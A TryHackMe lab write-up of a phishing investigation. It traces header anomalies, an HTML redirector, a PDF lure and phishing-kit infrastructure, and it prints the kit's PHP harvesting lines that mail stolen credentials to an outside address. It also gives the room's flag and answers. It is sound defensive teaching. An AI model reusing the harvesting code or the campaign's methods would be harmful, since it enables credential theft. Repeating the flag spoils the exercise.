# TryHackMe — Snapped Phish-ing Line

## Overview

This write-up documents the investigation performed during the TryHackMe **Snapped Phish-ing Line** room.

The objective of the room is to investigate a phishing campaign, analyze suspicious email attachments and URLs, identify the phishing infrastructure, examine the phishing kit, and determine whether credentials have been captured.

Rather than only answering the room questions, the investigation was approached from a SOC analyst perspective. Email headers, attachments, URLs, DNS, VirusTotal results, web-server behavior, the phishing kit, credential harvesting logic, and captured credential evidence were examined and correlated.

The investigation was performed inside the TryHackMe controlled laboratory environment.

---

## Investigation Methodology

The investigation followed a structured SOC workflow:

1. Identify suspicious characteristics in the emails.
2. Analyze email headers and authentication results.
3. Perform static analysis of attachments.
4. Extract and inspect URLs.
5. Investigate the associated infrastructure.
6. Compare multiple phishing emails for common indicators.
7. Analyze the phishing kit.
8. Examine the credential harvesting mechanism.
9. Investigate exposed credential logs.
10. Correlate all findings into an attack chain.
11. Decode the final flag.

A key principle throughout the investigation was to distinguish between **observed evidence**, **analyst interpretation**, and **unconfirmed assumptions**.

---

# 1. Initial Email Analysis

The desktop contained five email messages in `.eml` format.

Four messages followed a highly similar pattern:

- Sender: `Accounts.Payable@groupmarketingonline.icu`
- Subject related to a "Direct Credit Advice"
- Attachment: `Direct Credit Advice.html`

The fifth message used a different lure:

- Subject related to a quote for services rendered
- Attachment: `Quote.pdf`

The first four emails immediately appeared suspicious because a financial notification was delivered as an HTML attachment rather than as a conventional document.

The use of an HTML attachment was particularly relevant because HTML files can redirect a recipient to external web infrastructure when opened.

---

# 2. Email Header Analysis

The headers of the first email were inspected to determine whether the visible sender information was consistent with the underlying mail infrastructure.

Several authentication-related inconsistencies were observed.

The visible sender used:

`groupmarketingonline.icu`

while the Return-Path referenced:

`BRAEMARHOWELLS.COM`

A difference between the visible From address and Return-Path is not automatically malicious because legitimate email systems and third-party mailing services can use different envelope senders.

However, the combination of:

- Different visible From and Return-Path domains
- Missing DKIM
- Missing or inconsistent DMARC information
- Inconsistent SPF results

made the message worthy of further investigation.

## DNS Investigation

The Return-Path domain was resolved using:

    nslookup BRAEMARHOWELLS.COM

The domain resolved to:

    191.223.127.111

The IP was identified as being associated with:

    Dingfeng Xinhui Hongkong Technology Limited

This provided additional infrastructure context.

The IP ownership was not treated as proof that the organization itself was involved in the phishing campaign.

---

# 3. Static Analysis of Direct Credit Advice.html

The attachment was first identified using:

    file "Direct Credit Advice.html"

The result identified it as:

    HTML document, ASCII text, with CRLF, CR line terminators

The contents were then inspected.

The HTML contained an immediate meta-refresh redirect and a fallback hyperlink.

The redirect pointed to:

    http://kennaroads.buzz/data/Update365/office365/40e7baa2f826a57fcf04e5202526f8bd/?email=derick.marshall@swiftspend.finance&error

The attachment was therefore not a legitimate credit advice document.

Instead, it functioned as a redirector.

## Important Indicators

The destination domain was:

    kennaroads[.]buzz

The URL path contained:

    /data/Update365/office365/

The URL also contained the recipient's email address:

    email=derick.marshall@swiftspend.finance

This indicated that the phishing infrastructure could pass recipient-specific information to the next stage.

The use of an unrelated `.buzz` domain combined with an `office365` path was another strong indicator of Microsoft 365 impersonation.

---

# 4. VirusTotal Analysis

The SHA-256 hash of the HTML attachment was submitted to VirusTotal:

    c6ed70c3970a9ba62ef5f54be8608913a631f53e08e4914a4036299bb5d3ddb6

VirusTotal reported:

    0 / 62 security vendors flagged this file as malicious

This result was not interpreted as evidence that the file was safe.

Static analysis had already demonstrated that the file redirected the recipient to external phishing infrastructure.

This demonstrates an important SOC principle: reputation-based detection alone is insufficient.

A security analyst should consider:

- File behavior
- URLs
- Domains
- Infrastructure
- Context
- Similar samples
- Authentication anomalies

rather than relying solely on antivirus detections.

---

# 5. DNS Analysis of Phishing Infrastructure

The phishing domain was investigated using:

    dig kennaroads.buzz

The domain resolved to:

    172.67.216.206

The IP was associated with Cloudflare infrastructure.

This was treated as evidence that the domain was likely proxied through Cloudflare.

The IP was not treated as the origin server because a reverse proxy/CDN can conceal the actual hosting infrastructure.

An MX lookup was also performed:

    dig kennaroads.buzz mx

The lookup returned NXDOMAIN/no MX records.

The absence of an MX record was recorded as infrastructure context rather than malicious evidence by itself.

---

# 6. Investigating Web Server Behavior

The phishing URL was accessed carefully using `curl` rather than immediately following every redirect.

First, HTTPS was tested:

    curl -I "https://kennaroads.buzz/data/Update365/office365"

HTTPS returned a connection refusal.

HTTP was then tested:

    curl -I "http://kennaroads.buzz/data/Update365/office365"

The server returned:

    HTTP/1.1 301 Moved Permanently
    Location: http://kennaroads.buzz/data/Update365/office365/

The directory was then requested directly.

The server returned a `302 Found` response and indicated that PHP was being used:

    X-Powered-By: PHP/8.2.5

The server redirected to a dynamically generated path.

This demonstrated that the phishing infrastructure was dynamically generating paths rather than simply serving one static phishing page.

---

# 7. Controlled Dynamic Investigation

The generated phishing path was inspected without submitting real credentials.

When the expected parameters were omitted, the PHP application generated warnings including:

    Undefined array key "email"
    Undefined array key "error"

The errors also exposed information about the underlying PHP implementation.

A safe test address was then supplied:

    test@example.com

The application generated another dynamic redirect.

The next response redirected to:

    enterpassword.php

The returned HTML contained:

    <title>Sign in to your account</title>

The page also contained a Microsoft-style login interface with an email input field.

The supplied test email was populated into the login form.

This confirmed that the infrastructure was operating as a credential phishing site.

No real credentials were submitted during the investigation.

---

# 8. Identifying the Impersonated Company

The phishing page used Microsoft/Office 365 branding.

The URL path also contained:

    Update365/office365

The login interface contained Microsoft-style branding and an email/password authentication flow.

The company being impersonated was therefore:

**Microsoft**

---

# 9. Investigating the /data Directory

The `/data/` directory was accessible through directory listing.

The following command was used:

    curl -i "http://kennaroads.buzz/data/"

The listing contained:

    Update365.zip
    Update365/

The phishing kit archive was therefore identified as:

    Update365.zip

---

# 10. VirusTotal Analysis of the Phishing Kit

The phishing kit archive was investigated through VirusTotal.

The archive was associated with a:

**Trojan**

The archive contained:

**49 files**

This established that the campaign consisted of a larger phishing kit rather than a single standalone HTML page.

---

# 11. Credential Log Investigation

The `/data/Update365/` directory contained:

    log.txt
    office365/

The log file was investigated for captured credentials.

The investigation identified one user who had submitted credentials more than once:

    michael.ascot@swiftspend.finance

This provided direct evidence that victims had interacted with the phishing infrastructure.

---

# 12. Investigation of the Four Similar Phishing Emails

The four "Direct Credit Advice" messages were compared.

The same core characteristics were present:

- Same sender domain
- Same sender identity
- Same Return-Path pattern
- Same attachment filename
- Same HTML structure
- Same phishing domain
- Same `/data/Update365/office365/` path
- Recipient-specific email parameter

The recipient addresses differed between the messages.

The HTML attachments also had different SHA-256 hashes.

This difference was expected because the recipient email address was embedded directly into the HTML.

Therefore, the different hashes did not indicate that the samples were necessarily unrelated.

Instead, the evidence was consistent with recipient-specific variants of the same phishing mechanism.

This is consistent with an automated or templated phishing campaign.

---

# 13. Quote.pdf Investigation

The fifth email used a different attachment:

    Quote.pdf

The PDF was analyzed statically.

PDF metadata included:

    Author: User PC
    Creator: Microsoft® Word for Office 365
    Producer: Microsoft® Word for Office 365
    Creation Date: Fri Jun 26 03:34:12 2020 PST
    Modification Date: Fri Jun 26 03:34:12 2020 PST
    JavaScript: No
    Form: None
    Encrypted: No
    Pages: 1

The PDF text stated that a document had been sent via OneDrive and instructed the recipient to access it.

The document contained Microsoft/Office 365 branding and an "Access Document" button.

The metadata value `User PC` was not treated as attribution.

Metadata can be inherited, automatically generated, or manipulated and therefore does not establish the identity of the attacker.

---

# 14. PDF URI Analysis

The PDF was searched for links and annotations using:

    grep -aEi 'URI|Action|Annot|Link|kennaroads|OneDrive' "Quote.pdf"

A URI annotation was discovered pointing to:

    https://kennaroads.buzz/data/Update365/office365

This was a significant correlation.

The PDF therefore used Microsoft/OneDrive branding as the lure while directing the recipient to the same phishing infrastructure identified in the HTML attachments.

The campaign used multiple delivery mechanisms but shared the same backend infrastructure.

---

# 15. Additional PDF Analysis

The PDF was checked for embedded files using:

    pdfdetach -list "Quote.pdf"

No embedded files were found.

PDF image objects were also inspected using:

    pdfimages -list "Quote.pdf"

The document contained several image objects associated with the Microsoft/Office 365-themed graphical content.

These included the branding and visual elements used to make the document appear legitimate.

The important security finding was not the presence of images themselves, but the fact that the document contained a clickable URI annotation leading to the same phishing infrastructure.

---

# 16. Extracting the Phishing Kit

The phishing kit was extracted using:

    unzip Update365.zip -d Update365

The `submit.php` file was located using:

    find Update365 -name "submit.php" -type f

The file was then inspected using:

    cat "$(find Update365 -name "submit.php" -type f | head -n 1)"

---

# 17. Credential Harvesting Logic

The PHP source code demonstrated that the phishing site collected:

- Email address
- Password
- Client IP address
- User-Agent
- Country
- Timestamp

Relevant variables included:

    $email = $_POST['email'];
    $password = $_POST['password'];
    $ip = getenv("REMOTE_ADDR");

The captured information was assembled into a message.

The destination email address was:

    m3npat@yandex.com

The address was visible directly in the PHP mail function:

    mail("m3npat@yandex.com",$bron,$message,$lagi);

This provided direct evidence of the credential exfiltration mechanism.

The code also attempted to obtain geographic information based on the victim's IP address.

---

# 18. Credential Exposure

The phishing infrastructure exposed a log file under:

    /data/Update365/log.txt

Review of the log identified:

    michael.ascot@swiftspend.finance

as a user who had submitted credentials more than once.

This demonstrates that the phishing infrastructure was not merely prepared for credential collection.

There was evidence showing that victims had actually submitted credentials to the phishing system.

---

# 19. Attack Chain

The investigation allowed the phishing campaign to be reconstructed as follows:

    Victim receives phishing email
            |
            v
    Direct Credit Advice.html
            |
            v
    kennaroads[.]buzz
            |
            v
    /data/Update365/office365/
            |
            v
    Dynamic PHP redirect
            |
            v
    Microsoft 365 impersonation page
            |
            v
    Victim submits credentials
            |
            v
    submit.php
            |
            +--> Email
            +--> Password
            +--> Client IP
            +--> User-Agent
            +--> Country
            +--> Timestamp
            |
            v
    m3npat[@]yandex.com

A second delivery path was also identified:

    Phishing email
          |
          v
    Quote.pdf
          |
          v
    Microsoft/OneDrive lure
          |
          v
    PDF URI annotation
          |
          v
    kennaroads[.]buzz/data/Update365/office365/
          |
          v
    Same credential phishing infrastructure

---

# 20. Indicators of Compromise

| Type | Indicator | Description |
|---|---|---|
| Domain | `groupmarketingonline[.]icu` | Phishing sender domain |
| Domain | `braemarhowells[.]com` | Return-Path infrastructure |
| IP | `191.223.127.111` | IP associated with Return-Path domain |
| Domain | `kennaroads[.]buzz` | Phishing infrastructure |
| URL path | `/data/Update365/office365/` | Phishing backend |
| Email | `m3npat[@]yandex[.]com` | Credential collection destination |
| File | `Direct Credit Advice.html` | HTML redirector |
| File | `Quote.pdf` | Microsoft/OneDrive phishing lure |
| File | `Update365.zip` | Phishing kit |
| File | `log.txt` | Captured credential log |
| File | `submit.php` | Credential harvesting component |

HTML attachment SHA-256:

    c6ed70c3970a9ba62ef5f54be8608913a631f53e08e4914a4036299bb5d3ddb6

---

# 21. Investigation Timeline

## Stage 1 — Initial Delivery

Victims received phishing emails masquerading as financial/accounting communications.

## Stage 2 — Initial Redirection

The HTML attachment redirected victims toward the phishing infrastructure.

## Stage 3 — Infrastructure Processing

The web server generated dynamic paths and redirected the victim through the phishing framework.

## Stage 4 — Credential Phishing

The victim was presented with a fraudulent Microsoft 365 login page.

## Stage 5 — Credential Submission

Submitted credentials were processed by `submit.php`.

## Stage 6 — Data Collection

The phishing kit collected credentials and additional victim information.

## Stage 7 — Exfiltration

Captured information was configured to be sent to:

    m3npat[@]yandex.com

## Stage 8 — Victim Evidence

The exposed credential log demonstrated repeated credential submission by:

    michael.ascot@swiftspend.finance

---

# 22. Key Lessons Learned

## Antivirus Detection Is Not Enough

VirusTotal returned:

    0 / 62

for the HTML attachment.

Static analysis nevertheless demonstrated that the file was a phishing redirector.

This demonstrates why behavioral and contextual analysis is important.

---

## File Hashes Are Not Always Reliable Campaign Identifiers

The HTML files had different SHA-256 hashes because recipient-specific email addresses were embedded in the files.

The underlying behavior and infrastructure remained the same.

Campaign-level indicators such as domains, URL paths, sender patterns and behaviors can therefore be more useful than individual file hashes.

---

## Authentication Results Require Context

SPF, DKIM and DMARC results should not be interpreted independently of:

- Visible From address
- Return-Path
- Domain alignment
- Message content
- Attachment behavior
- Infrastructure

Authentication success does not automatically make an email trustworthy.

---

## Infrastructure Correlation Is Powerful

The HTML redirector and PDF attachment used different delivery mechanisms but ultimately pointed to:

    kennaroads[.]buzz/data/Update365/office365/

This provided strong evidence that the messages belonged to the same phishing campaign.

---

## Metadata Does Not Automatically Provide Attribution

The PDF contained:

    Author: User PC

This was treated as an artifact rather than evidence identifying the attacker.

Metadata can be automatically generated or manipulated.

---

## Controlled Interaction Is Safer

The phishing infrastructure was initially investigated using `curl` and safe test parameters rather than immediately submitting real credentials.

This allowed the behavior of the phishing application to be observed while minimizing risk.

---

# 23. Final Assessment

The investigation confirmed a credential phishing campaign impersonating Microsoft/Office 365.

The campaign used multiple social-engineering lures, including:

- Fake financial notifications
- Microsoft 365 branding
- OneDrive-themed document notifications

The phishing infrastructure used:

    kennaroads[.]buzz

and dynamically generated PHP paths to direct victims toward a fake Microsoft login page.

The phishing kit contained a credential harvesting backend capable of collecting credentials and additional victim information before forwarding the captured information to:

    m3npat[@]yandex.com

Captured credential logs confirmed that at least one user submitted credentials more than once:

    michael.ascot@swiftspend.finance

The evidence is consistent with an automated or templated phishing campaign using a reusable phishing kit and recipient-specific URLs.

---

# 24. Final Flag

The phishing infrastructure exposed:

    /data/Update365/office365/flag.txt

The file contained a Base64-encoded value:

    fUxSVV8zSHRfaFQxd195NExwe01IVAo=

The value was decoded using CyberChef.

The final TryHackMe flag was:

    THM{pL4y_w1Th_tH3_URL}

---

# Conclusion

The Snapped Phish-ing Line room demonstrated a complete phishing investigation workflow, from suspicious email identification through infrastructure analysis and credential harvesting.

The investigation went significantly beyond simply identifying the phishing page. By examining email headers, attachments, DNS, HTTP responses, PDF annotations, phishing-kit source code, and credential logs, the complete attack chain could be reconstructed.

The most important takeaway from the investigation is that phishing detection requires correlation across multiple sources of evidence.

A file with zero antivirus detections can still be malicious.

Different file hashes can still represent the same campaign.

Valid email authentication does not automatically establish legitimacy.

Infrastructure correlation can reveal relationships that are invisible when individual artifacts are examined in isolation.

The final flag was:

    THM{pL4y_w1Th_tH3_URL}

---

## Skills Demonstrated

- Phishing email analysis
- Email header analysis
- SPF/DKIM/DMARC interpretation
- Static HTML analysis
- URL analysis
- DNS investigation
- HTTP response analysis
- Controlled dynamic analysis
- VirusTotal analysis
- PDF analysis
- PDF URI/annotation analysis
- Archive analysis
- PHP source-code analysis
- Credential harvesting analysis
- IOC identification
- Infrastructure correlation
- Evidence-based incident analysis
- SOC investigation methodology
